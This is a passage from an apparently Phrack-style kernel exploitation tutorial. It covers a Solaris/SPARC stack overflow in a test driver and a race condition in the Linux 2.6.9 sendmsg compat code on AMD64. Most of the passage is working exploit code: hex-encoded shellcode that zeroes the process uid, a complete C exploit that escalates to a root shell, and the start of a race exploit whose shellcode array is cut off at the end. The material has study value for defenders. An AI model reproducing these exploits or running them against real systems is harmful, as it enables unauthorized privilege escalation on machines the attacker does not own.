saved in %g5 (by CPU_ADDR) and, from there,\nthe thread pointer [ cpu_t->cpu_thread ] is obtained.\nFrom the kthread_t struct is obtained the 'kernel stack address' [the\nmember name is called t_stk]. This one is a good news, since that member\nis easy accessible from within a shellcode (it's just a matter of\ncorrectly accessing the %g7 \/ thread pointer). From now on we can follow\nthe sys_trap path and we'll be able to figure out what we will find on the\nstack just after the kthread_t->t_stk value and where.\nTo that value is then subtracted 'STACK_BIAS' : the 64-bit v9 SPARC ABI\nspecifies that the %fp and %sp register are offset by a constant, the\nstack bias, which is 2047 bits. This is one thing that we've to remember\nwhile writing our 'stack fixup' shellcode.\nOn 32-bit running kernels the value of this constant is 0.\nThe save below is another good news, because that means that we can use\nthe t_stk value as a %fp (along with the 'right return address') to return\nat 'some valid point' inside the syscall path (and thus let it flow from\nthere and cleanily get back to userspace).\nThe question now is : at which point ? Do we have to 'hardcode' that\nreturn address or we can somehow gather it ?\nA further look at the syscall path reveals that :\nENTRY_NP(utl0)\nSAVE_GLOBALS(%l7)\nSAVE_OUTS(%l7)\nmov     %l6, THREAD_REG\nwrpr    %g0, PSTATE_KERN, %pstate       ! enable ints\njmpl    %l3, %o7                        ! call trap handler\nmov     %l7, %o0\nAnd, that %l3 is :\nhave_win:\nSYSTRAP_TRACE(%o1, %o2, %o3)\n!\n! at this point we have a new window we can play in,\n! and %g6 is the label we want done to bounce to\n!\n! save needed current globals\n!\nmov     %g1, %l3        ! pc\nmov     %g2, %o1        ! arg #1\nmov     %g3, %o2        ! arg #2\nsrlx    %g3, 32, %o3    ! pseudo arg #3\nsrlx    %g2, 32, %o4    ! pseudo arg #4\n%g1 was preserved since :\n#define SYSCALL(which)                  \\\nTT_TRACE(trace_gen)             ;\\\nset     (which), %g1            ;\\\nba,pt   %xcc, sys_trap          ;\\\nsub     %g0, 1, %g4             ;\\\n.align  32\nand so it is syscall_trap for LP64 syscall and syscall_trap32 for ILP32\nsyscall. Let's check if the stack layout is the one we expect to find :\n> ::ps ! grep snmp\nR    291      1    291    291     0 0x00020008 0000030000db4060 snmpXdmid\nR    278      1    278    278     0 0x00010008 0000030000d2f488 snmpdx\n> ::ps ! grep snmpdx\nR    278      1    278    278     0 0x00010008 0000030000d2f488 snmpdx\n> 0000030000d2f488::print proc_t p_tlist\np_tlist = 0x30001dd4800\n> 0x30001dd4800::print kthread_t t_stk\nt_stk = 0x2a100497af0 \"\"\n> 0x2a100497af0,16\/K\n0x2a100497af0:  1007374         2a100497ba0     30001dd2048     1038a3c\n1449e10         0               30001dd4800\n2a100497ba0     ffbff700        3               3a980\n0               3a980           0\nffbff6a0        ff1525f0        0               0\n0               0               0\n0\n> syscall_trap32=X\n1038a3c\n>\nAnalyzing the 'stack frame' we see that the saved %l6 is exactly\nTHREAD_REG (the thread value, 30001dd4800) and %l3 is 1038a3c, the\nsyscall_trap32 address.\nAt that point we're ready to write our 'shellcode' :\n# cat sparc_stack_fixup64.s\n.globl begin\n.globl end\nbegin:\nldx [%g7+0x118], %l0\nldx [%l0+0x20], %l1\nst %g0, [%l1 + 4]\nldx [%g7+8], %fp\nldx [%fp+0x18], %i7\nsub %fp,2047,%fp\nadd 0xa8, %i7, %i7\nret\nrestore\nend:\n#\nAt that point it should be quite readable : it gets the t_procp address\nfrom the kthread_t struct and from there it gets the p_cred addr.\nIt then sets to zero (the %g0 register is hardwired to zero) the cr_uid\nmember of the cred_t struct and uses the kthread_t->t_stk value to set\n%fp. %fp is then dereferenced to get the 'syscall_trap32' address and the\nSTACK_BIAS subtraction is then performed.\nThe add 0xa8 is the only hardcoded value, and it's the 'return place'\ninside syscall_trap32. You can quickly derive it from a ::findstack dcmd\nwith mdb. A more advanced shellcode could avoid this 'hardcoded value' by\nopcode scanning from the start of the syscall_trap32 function and looking\nfor the jmpl %reg,%o7\/nop sequence (syscall_trap32 doesn't get a new\nwindow, and stays in the one sys_trap had created) pattern.\nOn all the boxes we tested it was always 0xa8, that's why we just left it\nhardcoded.\nAs we said, we need the shellcode to be into the command line, 'shifted'\nof 3 bytes to obtain the correct alignment. To achieve that a simple\nlauncher code was used :\nbash-2.05$ cat launcer_stack.c\n#include <unistd.h>\nchar sc[] = \"\\x66\\x66\\x66\"              \/\/ padding for alignment\n\"\\xe0\\x59\\xe1\\x18\\xe2\\x5c\\x20\\x20\\xc0\\x24\\x60\\x04\\xfc\\x59\\xe0\"\n\"\\x08\\xfe\\x5f\\xa0\\x18\\xbc\\x27\\xa7\\xff\\xbe\\x07\\xe0\\xa8\\x81\"\n\"\\xc7\\xe0\\x08\\x81\\xe8\\x00\\x00\";\nint main()\n{\nexecl(\"e\", sc, NULL);\nreturn 0;\n}\nbash-2.05$\nThe shellcode is the one presented before.\nBefore showing the exploit code, let's just paste the vulnerable code,\nfrom the dummy driver provided for Solaris :\n< stuff\/drivers\/solaris\/test.c >\n[...]\nstatic int handle_stack (intptr_t arg)\n{\nchar buf[32];\nstruct test_comunique t_c;\nddi_copyin((void *)arg, &t_c, sizeof(struct test_comunique), 0);\ncmn_err(CE_CONT, \"Requested to copy over buf %d bytes from %p\\n\",\nt_c.size, &buf);\nddi_copyin((void *)t_c.addr, buf, t_c.size, 0); [1]\nreturn 0;\n}\nstatic int test_ioctl (dev_t dev, int cmd, intptr_t arg, int mode,\ncred_t *cred_p, int *rval_p )\n{\ncmn_err(CE_CONT, \"ioctl called : cred %d %d\\n\", cred_p->cr_uid,\ncred_p->cr_gid);\nswitch ( cmd )\n{\ncase TEST_STACKOVF: {\nhandle_stack(arg);\n}\n[...]\n< \/ >\nThe vulnerability is quite self explanatory and is a lack of 'input\nsanitizing' before calling the ddi_copyin at [1].\nExploit follows :\n< stuff\/expl\/solaris\/e_stack.c >\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <sys\/mman.h>\n#include <sys\/types.h>\n#include <sys\/stat.h>\n#include <fcntl.h>\n#include \"test.h\"\n#define BUFSIZ 192\nchar buf[192];\ntypedef struct psinfo {\nint     pr_flag;        \/* process flags *\/\nint     pr_nlwp;        \/* number of lwps in process *\/\npid_t   pr_pid;         \/* unique process id *\/\npid_t   pr_ppid;        \/* process id of parent *\/\npid_t   pr_pgid;        \/* pid of process group leader *\/\npid_t   pr_sid;         \/* session id *\/\nuid_t   pr_uid;         \/* real user id *\/\nuid_t   pr_euid;        \/* effective user id *\/\ngid_t   pr_gid;         \/* real group id *\/\ngid_t   pr_egid;        \/* effective group id *\/\nuintptr_t pr_addr;      \/* address of process *\/\nsize_t  pr_size;        \/* size of process image in Kbytes *\/\n} psinfo_t;\n#define ALIGNPAD        3\n#define PSINFO_PATH     \"\/proc\/self\/psinfo\"\nunsigned long getaddr()\n{\npsinfo_t        info;\nint             fd;\nfd = open(PSINFO_PATH, O_RDONLY);\nif ( fd == -1)\n{\nperror(\"open\");\nreturn -1;\n}\nread(fd, (char *)&info, sizeof (info));\nclose(fd);\nreturn info.pr_addr;\n}\n#define UPSARGS_OFFSET 0x330 + 0x161\nint exploit_me()\n{\nchar    *argv[] = { \"princess\", NULL };\nchar    *envp[] = { \"TERM=vt100\", \"BASH_HISTORY=\/dev\/null\",\n\"HISTORY=\/dev\/null\", \"history=\/dev\/null\",\n\"PATH=\/bin:\/sbin:\/usr\/bin:\/usr\/sbin:\/usr\/local\/bin:\/usr\/local\/sbin\",\n\"HISTFILE=\/dev\/null\", NULL };\nprintf(\"Pleased to see you, my Princess\\n\");\nsetreuid(0, 0);\nsetregid(0, 0);\nexecve(\"\/bin\/sh\", argv, envp);\nexit(0);\n}\n#define SAFE_FP     0x0000000001800040 + 1\n#define DUMMY_FILE  \"\/tmp\/test\"\nint main()\n{\nint                     fd;\nint                     ret;\nstruct test_comunique   t;\nunsigned long           *pbuf, retaddr, p_addr;\nmemset(buf, 'A', BUFSIZ);\np_addr = getaddr();\nprintf(\"[*] - Using proc_t addr : %p \\n\", p_addr);\nretaddr = p_addr + UPSARGS_OFFSET + ALIGNPAD;\nprintf(\"[*] - Using ret addr : %p\\n\", retaddr);\npbuf = &buf[32];\npbuf += 2;\n\/* locals *\/\nfor ( ret = 0; ret < 14; ret++ )\n*pbuf++ = 0xBBBBBBBB + ret;\n*pbuf++ = SAFE_FP;\n*pbuf = retaddr - 8;\nt.size = sizeof(buf);\nt.addr = buf;\nfd = open(DUMMY_FILE, O_RDONLY);\nret = ioctl(fd, 1, &t);\nprintf(\"fun %d\\n\", ret);\nexploit_me();\nclose(fd);\n}\n< \/ >\nThe exploit is quite simple (we apologies, but we didn't have a public one\nto show at time of writing) :\n- getaddr() uses procfs exported psinfo data to get the proc_t address\nof the running process.\n- the return addr is calculated from proc_t addr + the offset of the\nu_psargs array + the three needed bytes for alignment\n- SAFE_FP points just 'somewhere in the data segment' (and ready to be\nbiased for the real dereference). Due to SPARC window mechanism we\nhave to provide a valid address that it will be used to 'load' the\nsaved procedure registers upon re-entering. We don't write on that\naddress so whatever readable kernel part is safe. (in more complex\nscenarios you could have to write over too, so take care).\n- \/tmp\/test is just a link to the \/devices\/pseudo\/test@0:0 file\n- the exploit has to be compiled as a 32-bit executable, so that the\nsyscall_trap32 offset is meaningful\nYou can compile and test the driver on your boxes, it's really simple. You\ncan extend it to test more scenarios, the skeleton is ready for it.\n------[ 2.4 - A primer on logical bugs : race conditions\nHeap and Stack Overflow (even more, NULL pointer dereference) are\nseldomly found on their own, and, since the automatic and human auditing\nwork goes on and on, they're going to be even more rare.\nWhat will probably survive for more time are 'logical bugs', which may\nlead, at the end, to a classic overflow.\nFigure out a modelization of 'logical bugs' is, in our opinion, nearly\nimpossible, each one is a story on itself.\nNotwithstanding this, one typology of those is quite interesting (and\n'widespread') and at least some basic approaches to it are suitable for a\ngeneric description.\nWe're talking about 'race conditions'.\nIn short, we have a race condition everytime we have a small window of\ntime that we can use to subvert the operating system behaviour. A race\ncondition is usually the consequence of a forgotten lock or other\nsyncronization primitive or the use of a variable 'too much time after'\nthe sanitizing of its value. Just point your favorite vuln database search\nengine towards 'kernel race condition' and you'll find many different\nexamples.\nWinning the race is our goal. This is easier on SMP systems, since the two\nracing threads (the one following the 'raceable kernel path' and the other\ncompeting to win the race) can be scheduled (and be bounded) on different\nCPUs. We just need to have the 'racing thread' go faster than the other\none, since they both can execute in parallel.\nWinning a race on UP is harder : we have to force the first kernel path\nto sleep (and thus to re-schedule). We have also to 'force' the scheduler\ninto selecting our 'racing' thread, so we have to take care of scheduling\nalgorithm implementation (ex. priority based). On a system with a low CPU\nload this is generally easy to get : the racing thread is usually\n'spinning' on some condition and is likely the best candidate on the\nrunqueue.\nWe're going now to focus more on 'forcing' a kernel path to sleep,\nanalyzing the nowadays common interface to access files, the page cache.\nAfter that we'll present the AMD64 architecture and show a real race\nexploit for Linux on it, based on the sendmsg [5] vulnerability.\nWinning the race in that case turns the vuln into a stack based one, so\nthe discussion will analize stack based explotation on Linux\/AMD64 too.\n---[ 2.4.1 - Forcing a kernel path to sleep\nIf you want to win a race, what's better than slowing down your opponent?\nAnd what's slower than accessing the hard disk, in a modern computer ?\nOperating systems designers know that the I\/O over the disk is one of the\nmajor bottleneck on system performances and know aswell that it is one of\nthe most frequent operations requested.\nDisk accessing and Virtual Memory are closely tied : virtual memory needs\nto access the disk to accomplish demand paging and in\/out swapping, while\nthe filesystem based I\/O (both direct read\/write and memory mapping of\nfiles) works in units of pages and relays on VM functions to perform the\nwrite out of 'dirty' pages. Moreover, to sensibly increase performances,\nfrequently accessed disk pages are kept in RAM, into the so-called 'Page\nCache'.\nSince RAM isn't an inexhaustible resource, pages to be loaded and 'cached'\ninto it have to be carefully 'selected'. The first skimming is made by the\n'Demand Paging' approach : a page is loaded from disk into memory only\nwhen it is referenced, by the page fault handler code.\nOnce a filesystem page is loaded into memory, it enters into the 'Page\nCache' and stays in memory for an unspecified time (depending on disk\nactivity and RAM availability, generally a LRU policy is used as an\nevict-policy).\nSince it's quite common for an userland application to repeatedly access\nthe same disk content\/pages (or for different applications, to access\ncommon files), the 'Page Cache' sensibly increases performances.\nOne last thing that we have to discuss is the filesystem 'page clustering'.\nAnother common principle in 'caching' is the 'locality'. Pages near the\nreferenced one are likely to be accessed in a near future and since we're\naccessing the disk we can avoid the future seek-rotation latency if we\nload in more pages after the referenced one. How many to load is\ndetermined by the page cluster value.\nOn Linux that value is 3, so 2^3 pages are loaded after the referenced\none. On Solaris, if the pages are 8-kb sized, the next eight pages on a\n64kb boundary are brought in by the seg_vn driver (mmap-case).\nPutting all together, if we want to force a kernel path to sleep we need\nto make it reference an un-cached page, so that a 'fault' happens due to\ndemand paging implementation. The page fault handler needs to perform disk\nI\/O, so the process is put to sleep and another one is selected by the\nscheduler. Since probably we want aswell our 'controlled contents' to be\nat the faulting address we need to mmap the pages, modify them and then\nexhaust the page cache before making the kernel re-access them again.\nFilling the 'page cache' has also the effect of consuming a large quantity\nof RAM and thus increasing the in\/out swapping. On modern operating\nsystems one can't create a condition of memory pressure only by exhausting\nthe page cache (as it was possible on very old implementations), since\nonly some amount of RAM is dedicated to the Page Cache and it would keep\non stealing pages from itself, leaving other subsystems free to perform\nwell. But we can manage to exhaust those subsystem aswell, for example by\nmaking the kernel do a large amount of 'surviving' slab-allocations.\nWorking to put the VM under pressure is something to take always in mind,\nsince, done that, one can manage to slow down the kernel (favouring races)\nand make kmalloc or other allocation function to fail. (A thing that\nseldomly happens on normal behaviour).\nIt is time, now, for another real life situation. We'll show the sendmsg\n[5] vulnerability and exploiting code and we'll describe briefly the AMD64\narchitectural more exploiting-relevant details.\n---[ 2.4.2 - AMD64 and race condition exploiting: sendmsg\nAMD64 is the 64-bit 'extension' of the x86 architecture, which is natively\nsupported. It supports 64-bit registers, pointers\/virtual addresses and\ninteger\/logic operations. AMD64 has two primary modes of operation, 'Long\nmode', which is the standard 64-bit one (32-bit and 16-bit binaries can be\nstill run with almost no performance impact, or even, if recompiled, with\nsome benefit from the extended number of registers, thanks to the\nsometimes-called 'compatibility mode') and 'Legacy mode', for 32-bit\noperating systems, which is basically just like having a standard x86\nprocessor environment.\nEven if we won't use all of them in the sendmsg exploit, we're going now\nto sum a couple of interesting features of the AMD64 architecture :\n- The number of general purpose register has been extended from 8 up to\n16. The registers are all 64-bit long (referred with 'r[name|num]',\nf.e. rax, r10). Just like what happened when took over the transition\nfrom 16-bit to 32-bit, the lower 32-bit of general purpose register\nare accessible with the 'e' prefix (f.e. eax).\n- push\/pop on the stack are 64-bit operations, so 8 bytes are\npushed\/popped each time. Pointers are 64-bit too and that allows a\ntheorical virtual address space of 2^64 bytes. As happens for the\nUltraSPARC architecture, current implementations address a limited\nvirtual address space (2^48 bytes) and thus have a VA-hole (the least\nsignificant 48 bits are used and bits from 48 up to 63 must be copies\nof bit 47 : the hole is thus between 0x7FFFFFFFFFFF and\n0xFFFF800000000000).\nThis limitation is strictly implementation-dependant, so any future\nimplementation might take advantage of the full 2^64 bytes range.\n- It is now possible to reference data relative to the Instruction\nPointer register (RIP). This is both a good and a bad news, since it\nmakes easier writing position independent (shell)code, but also makes\nit more efficient (opening the way for more performant PIE-alike\nimplementations)\n- The (in)famous NX bit (bit 63 of the page table entry) is implemented\nand so pages can be marked as No-Exec by the operating system. This is\nless an issue than over UltraSPARC since actually there's no operating\nsystem which implements a separated userspace\/kernelspace addressing,\nthus leaving open space to the use of the 'return-to-userspace'\ntecnique.\n- AMD64 doesn't support anymore (in 'long mode') the use of\nsegmentation. This choice makes harder, in our opinion, the creation\nof a separated user\/kernel address space. Moreover the FS and GS\nregisters are still used for different pourposes. As we'll see, the\nLinux Operating System keeps the GS register pointing to the 'current'\nPDA (Per Processor Data Structure). (check : \/include\/asm-x86_64\/pda.h\nstruct x8664_pda .. anyway we'll get back on that in a short).\nAfter this brief summary (if you want to learn more about the AMD64\narchitecture you can check the reference manuals at [3]) it is time now to\nfocus over the 'real vulnerability', the sendmsg [5] one :\n\"When we copy 32bit ->msg_control contents to kernel, we walk the\nsame userland data twice without sanity checks on the second pass.\nMoreover, if original looks small enough, we end up copying to on-stack\narray.\"\n< linux-2.6.9\/net\/compat.c >\nint cmsghdr_from_user_compat_to_kern(struct msghdr *kmsg,\nunsigned char *stackbuf, int stackbuf_size)\n{\nstruct compat_cmsghdr __user *ucmsg;\nstruct cmsghdr *kcmsg, *kcmsg_base;\ncompat_size_t ucmlen;\n__kernel_size_t kcmlen, tmp;\nkcmlen = 0;\nkcmsg_base = kcmsg = (struct cmsghdr *)stackbuf;            [1]\n[...]\nwhile(ucmsg != NULL) {\nif(get_user(ucmlen, &ucmsg->cmsg_len))              [2]\nreturn -EFAULT;\n\/* Catch bogons. *\/\nif(CMSG_COMPAT_ALIGN(ucmlen) <\nCMSG_COMPAT_ALIGN(sizeof(struct compat_cmsghdr)))\nreturn -EINVAL;\nif((unsigned long)(((char __user *)ucmsg - (char __user\n*)kmsg->msg_control)\n+ ucmlen) > kmsg->msg_controllen) [3]\nreturn -EINVAL;\ntmp = ((ucmlen - CMSG_COMPAT_ALIGN(sizeof(*ucmsg))) +\nCMSG_ALIGN(sizeof(struct cmsghdr)));\nkcmlen += tmp;                                       [4]\nucmsg = cmsg_compat_nxthdr(kmsg, ucmsg, ucmlen);\n}\n[...]\nif(kcmlen > stackbuf_size)                                   [5]\nkcmsg_base = kcmsg = kmalloc(kcmlen, GFP_KERNEL);\n[...]\nwhile(ucmsg != NULL) {\n__get_user(ucmlen, &ucmsg->cmsg_len);                [6]\ntmp = ((ucmlen - CMSG_COMPAT_ALIGN(sizeof(*ucmsg))) +\nCMSG_ALIGN(sizeof(struct cmsghdr)));\nkcmsg->cmsg_len = tmp;\n__get_user(kcmsg->cmsg_level, &ucmsg->cmsg_level);\n__get_user(kcmsg->cmsg_type, &ucmsg->cmsg_type);\n\/* Copy over the data. *\/\nif(copy_from_user(CMSG_DATA(kcmsg),                  [7]\nCMSG_COMPAT_DATA(ucmsg),\n(ucmlen -\nCMSG_COMPAT_ALIGN(sizeof(*ucmsg)))))\ngoto out_free_efault;\n< \/ >\nAs it is said in the advisory, the vulnerability is a double-reference to\nsome userland data (at [2] and at [6]) without sanitizing the value the\nsecond time it is got from the userland (at [3] the check is performed,\ninstead). That 'data' is the 'size' of the user-part to copy-in\n('ucmlen'), and it's used, at [7], inside the copy_from_user.\nThis is a pretty common scenario for a race condition : if we create two\ndifferent threads, make the first one enter the codepath and , after [4],\nwe manage to put it to sleep and make the scheduler choice the other\nthread, we can change the 'ucmlen' value and thus perform a 'buffer\noverflow'.\nThe kind of overflow we're going to perform is 'decided' at [5] : if the\nlen is little, the buffer used will be in the stack, otherwise it will be\nkmalloc'ed. Both the situation are exploitable, but we've chosen the stack\nbased one (we have already presented a slab exploit for the Linux\noperating system before). We're going to use, inside the exploit, the\ntecnique we've presented in the subsection before to force a process to\nsleep, that is making it access data on a cross page boundary (with the\nsecond page never referenced before nor already swapped in by the page\nclustering mechanism) :\n+------------+ --------> 0x20020000 [MMAP_ADDR + 32 * PAGE_SIZE] [*]\n|            |\n| cmsg_len   |           first cmsg_len starts at 0x2001fff4\n| cmsg_level |           first struct compat_cmsghdr\n| cmsg_type  |\n|------------| -------->              0x20020000  [cross page boundary]\n| cmsg_len   |           second cmsg_len starts at 0x20020000)\n| cmsg_level |           second struct compat_cmsghdr\n| cmsg_type  |\n|            |\n+------------+ --------> 0x20021000\n[*] One of those so-called 'runtime adjustement'. The page clustering\nwasn't showing the expected behaviour in the first 32 mmaped-pages,\nwhile was just working as expected after.\nAs we said, we're going to perform a stack-based explotation writing past\nthe 'stackbuf' variable. Let's see where we get it from :\n< linux-2.6.9\/net\/socket.c >\nasmlinkage long sys_sendmsg(int fd, struct msghdr __user *msg, unsigned\nflags)\n{\nstruct compat_msghdr __user *msg_compat =\n(struct compat_msghdr __user *)msg;\nstruct socket *sock;\nchar address[MAX_SOCK_ADDR];\nstruct iovec iovstack[UIO_FASTIOV], *iov = iovstack;\nunsigned char ctl[sizeof(struct cmsghdr) + 20];\nunsigned char *ctl_buf = ctl;\nstruct msghdr msg_sys;\nint err, ctl_len, iov_size, total_len;\n[...]\nif ((MSG_CMSG_COMPAT & flags) && ctl_len) {\nerr = cmsghdr_from_user_compat_to_kern(&msg_sys, ctl, sizeof(ctl));\n[...]\n< \/ >\nThe situation is less nasty as it seems (at least on the systems we tested\nthe code on) : thanks to gcc reordering the stack variables we get our\n'msg_sys' struct placed as if it was the first variable.\nThat simplifies a lot our exploiting task, since we don't have to take\ncare of 'emulating' in userspace the structure referenced between our\noverflow and the 'return' of the function (for example the struct sock).\nExploiting in this 'second case' would be slightly more complex, but\ndoable aswell.\nThe shellcode for the exploit is not much different (as expected, since\nthe AMD64 is a 'superset' of the x86 architecture) from the ones provided\nbefore for the Linux\/x86 environment, netherless we've two focus on two\nimportant different points : the 'thread\/task struct dereference' and the\n'userspace context switch approach'.\nFor the first point, let's start analyzing the get_current()\nimplementation :\n< linux-2.6.9\/include\/asm-x86_64\/current.h >\n#include <asm\/pda.h>\nstatic inline struct task_struct *get_current(void)\n{\nstruct task_struct *t = read_pda(pcurrent);\nreturn t;\n}\n#define current get_current()\n[...]\n#define GET_CURRENT(reg) movq %gs:(pda_pcurrent),reg\n< \/ >\n< linux-2.6.9\/include\/asm-x86_64\/pda.h >\nstruct x8664_pda {\nstruct task_struct *pcurrent;   \/* Current process *\/\nunsigned long data_offset;      \/* Per cpu data offset from linker\naddress *\/\nstruct x8664_pda *me;       \/* Pointer to itself *\/\nunsigned long kernelstack;  \/* top of kernel stack for current *\/\n[...]\n#define pda_from_op(op,field) ({ \\\ntypedef typeof_field(struct x8664_pda, field) T__; T__ ret__; \\\nswitch (sizeof_field(struct x8664_pda, field)) {                 \\\ncase 2: \\\nasm volatile(op \"w %%gs:%P1,%0\":\"=r\"\n(ret__):\"i\"(pda_offset(field)):\"memory\"); break;\\\n[...]\n#define read_pda(field) pda_from_op(\"mov\",field)\n< \/ >\nThe task_struct is thus no more into the 'current stack' (more precisely,\nreferenced from the thread_struct which is actually saved into the\n'current stack'), but is stored into the 'struct x8664_pda'. This struct\nkeeps many information relative to the 'current' process and the CPU it is\nrunning over (kernel stack address, irq nesting counter, cpu it is running\nover, number of NMI on that cpu, etc).\nAs you can see from the 'pda_from_op' macro, during the execution of a\nKernel Path, the address of the 'struct x8664_pda' is kept inside the %gs\nregister. Moreover, the 'pcurrent' member (which is the one we're actually\ninterested in) is the first one, so obtaining it from inside a shellcode\nis just a matter of doing a :\nmovq %gs:0x0, %rax\nFrom that point on the 'scanning' to locate uid\/gid\/etc is just the same\nused in the previously shown exploits.\nThe second point which quite differs from the x86 case is the 'restore'\npart (which is, also, a direct consequence of the %gs using).\nFirst of all we have to do a '64-bit based' restore, that is we've to push\nthe 64-bit registers RIP,CC,RFLAGS,RSP and SS and call, at the end, the\n'iretq' instruction (the extended version of the 'iret' one on x86).\nJust before returning we've to remember to perform the 'swapgs'\ninstruction, which swaps the %gs content with the one of the KernelGSbase\n(MSR address C000_0102h).\nIf we don't perform the gs restoring, at the next syscall or interrupt the\nkernel will use an invalid value for the gs register and will just crash.\nHere's the shellcode in asm inline notation :\nvoid stub64bit()\n{\nasm volatile (\n\"movl %0, %%esi\\t\\n\"\n\"movq %%gs:0, %%rax\\n\"\n\"xor %%ecx, %%ecx\\t\\n\"\n\"1: cmp $0x12c, %%ecx\\t\\n\"\n\"je 4f\\t\\n\"\n\"movl (%%rax), %%edx\\t\\n\"\n\"cmpl %%esi, %%edx\\t\\n\"\n\"jne 3f\\t\\n\"\n\"movl 0x4(%%rax),%%edx\\t\\n\"\n\"cmp %%esi, %%edx\\t\\n\"\n\"jne 3f\\t\\n\"\n\"xor %%edx, %%edx\\t\\n\"\n\"movl %%edx, 0x4(%%rax)\\t\\n\"\n\"jmp 4f\\t\\n\"\n\"3: add $4,%%rax\\t\\n\"\n\"inc %%ecx\\t\\n\"\n\"jmp 1b\\t\\n\"\n\"4:\\t\\n\"\n\"swapgs\\t\\n\"\n\"movq $0x000000000000002b,0x20(%%rsp)\\t\\n\"\n\"movq %1,0x18(%%rsp)\\t\\n\"\n\"movq $0x0000000000000246,0x10(%%rsp)\\t\\n\"\n\"movq $0x0000000000000023,0x8(%%rsp)\\t\\n\"\n\"movq %2,0x0(%%rsp)\\t\\n\"\n\"iretq\\t\\n\"\n: : \"i\"(UID), \"i\"(STACK_OFFSET), \"i\"(CODE_OFFSET)\n);\n}\nWith UID being the 'uid' of the current running process and STACK_OFFSET\nand CODE_OFFSET the address of the stack and code 'segment' we're\nreturning into in userspace. All those values are taken and patched at\nruntime in the exploit 'make_kjump' function :\n< stuff\/expl\/linux\/sracemsg.c >\n#define PAGE_SIZE 0x1000\n#define MMAP_ADDR ((void*)0x20000000)\n#define MMAP_NULL ((void*)0x00000000)\n#define PAGE_NUM 128\n#define PATCH_CODE(base,offset,value) \\\n*((uint32_t *)((char*)base + offset)) = (uint32_t)(value)\n#define fatal_errno(x,y) { perror(x); exit(y); }\nstruct cmsghdr *g_ancillary;\n\/* global shared value to sync threads for race *\/\nvolatile static int glob_race = 0;\n#define UID_OFFSET 1\n#define STACK_OFF_OFFSET 69\n#define CODE_OFF_OFFSET  95\n[...]\nint make_kjump(void)\n{\nvoid *stack_map = mmap((void*)(0x11110000), 0x2000,\nPROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0, 0);\nif(stack_map == MAP_FAILED)\nfatal_errno(\"mmap\", 1);\nvoid *shellcode_map = mmap(MMAP_NULL, 0x1000,\nPROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 0,\n0);\nif(shellcode_map == MAP_FAILED)\nfatal_errno(\"mmap\", 1);\nmemcpy(shellcode_map, kernel_stub, sizeof(kernel_stub)-1);\nPATCH_CODE(MMAP_NULL, UID_OFFSET, getuid());\nPATCH_CODE(MMAP_NULL, STACK_OFF_OFFSET, 0x11111111);\nPATCH_CODE(MMAP_NULL, CODE_OFF_OFFSET,  &eip_do_exit);\n}\n< \/ >\nThe rest of the exploit should be quite self-explanatory and we're going\nto show the code here after in a short. Note the lowering of the priority\ninside start_thread_priority ('nice(19)'), so that we have some more\nchance to win the race (the 'glob_race' variable works just like a\nspinning lock for the main thread - check 'race_func()').\nAs a last note, we use the 'rdtsc' (read time stamp counter) instruction\nto calculate the time that intercurred while trying to win the race. If\nthis gap is high it is quite probable that a scheduling happened.\nThe task of 'flushing all pages' (inside page cache), so that we'll be\nsure that we'll end using demand paging on cross boundary access, is not\nimplemented inside the code (it could have been easily added) and is left\nto the exploit runner. Since we have to create the file with controlled\ndata, those pages end up cached in the page cache. We have to force the\nsubsystem into discarding them. It shouldn't be hard for you, if you\nfollowed the discussion so far, to perform tasks that would 'flush the\nneeded pages' (to disk) or add code to automatize it. (hint : mass find &\ncat * > \/dev\/null is an idea).\nLast but not least, since the vulnerable function is inside 'compat.c',\nwhich is the 'compatibility mode' to run 32-bit based binaries, remember to\ncompile the exploit with the -m32 flag.\n< stuff\/expl\/linux\/sracemsg.c >\n#include <stdio.h>\n#include <signal.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdint.h>\n#include <sys\/types.h>\n#include <sys\/stat.h>\n#include <fcntl.h>\n#include <sys\/mman.h>\n#include <sched.h>\n#include <sys\/socket.h>\n#define PAGE_SIZE 0x1000\n#define MMAP_ADDR ((void*)0x20000000)\n#define MMAP_NULL ((void*)0x00000000)\n#define PAGE_NUM 128\n#define PATCH_CODE(base,offset,value) \\\n*((uint32_t *)((char*)base + offset)) = (uint32_t)(value)\n#define fatal_errno(x,y) { perror(x); exit(y); }\nstruct cmsghdr *g_ancillary;\n\/* global shared value to sync threads for race *\/\nvolatile static int glob_race = 0;\n#define UID_OFFSET 1\n#define STACK_OFF_OFFSET 69\n#define CODE_OFF_OFFSET  95\nchar kernel_stub[] =\n\"\\xbe\\xe8\\x03\\x00\\x00\"                   \/\/  mov    $0x3e8,%esi\n\"\\x65\\x48\\x8b\\x04\\x25\\x00\\x00\\x00\\x00\"   \/\/  mov    %gs:0x0,%rax\n\"\\x31\\xc9\"                               \/\/  xor    %ecx,%ecx  (15\n\"\\x81\\xf9\\x2c\\x01\\x00\\x00\"               \/\/  cmp    $0x12c,%ecx\n\"\\x74\\x1c\"                               \/\/  je     400af0\n<stub64bit+0x38>\n\"\\x8b\\x10\"                               \/\/  mov    (%rax),%edx\n\"\\x39\\xf2\"                               \/\/  cmp    %esi,%edx\n\"\\x75\\x0e\"                               \/\/  jne    400ae8\n<stub64bit+0x30>\n\"\\x8b\\x50\\x04\"                           \/\/  mov    0x4(%rax),%edx\n\"\\x39\\xf2\"                               \/\/  cmp    %esi,%edx\n\"\\x75\\x07\"                               \/\/  jne    400ae8\n<stub64bit+0x30>\n\"\\x31\\xd2\"                               \/\/  xor    %edx,%edx\n\"\\x89\\x50\\x04\"                           \/\/  mov    %edx,0x4(%rax)\n\"\\xeb\\x08\"                               \/\/  jmp    400af0\n<stub64bit+0x38>\n\"\\x48\\x83\\xc0\\x04\"                       \/\/  add    $0x4,%rax\n\"\\xff\\xc1\"                               \/\/  inc    %ecx\n\"\\xeb\\xdc\"                               \/\/  jmp    400acc\n<stub64bit+0x14>\n\"\\x0f\\x01\\xf8\"                           \/\/  swapgs (54\n\"\\x48\\xc7\\x44\\x24\\x20\\x2b\\x00\\x00\\x00\"   \/\/  movq   $0x2b,0x20(%rsp)\n\"\\x48\\xc7\\x44\\x24\\x18\\x11\\x11\\x11\\x11\"   \/\/  movq   $0x11111111,0x18(%rsp)\n\"\\x48\\xc7\\x44\\x24\\x10\\x46\\x02\\x00\\x00\"   \/\/  movq   